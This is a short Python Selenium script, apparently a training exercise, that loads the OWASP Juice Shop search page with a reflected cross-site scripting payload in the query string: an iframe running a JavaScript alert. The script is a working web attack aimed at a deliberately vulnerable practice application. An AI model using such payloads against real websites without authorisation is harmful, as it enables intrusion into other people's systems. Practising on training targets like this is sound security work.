from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains

#injection of XSS function
def inject_XSS():
    #create payload and url 
    url = "https://juice-shop.herokuapp.com/#/search"
    payload = '?q=<iframe%20src%3D"javascript:alert(%60xss%60)">'
    #create payload url with JS 
    url = url + payload

    #establish session
    driver = webdriver.Firefox(options=webdriver.FirefoxOptions())
    driver.get(url)
    #initialize actions driver
    action = ActionChains(driver)


inject_XSS()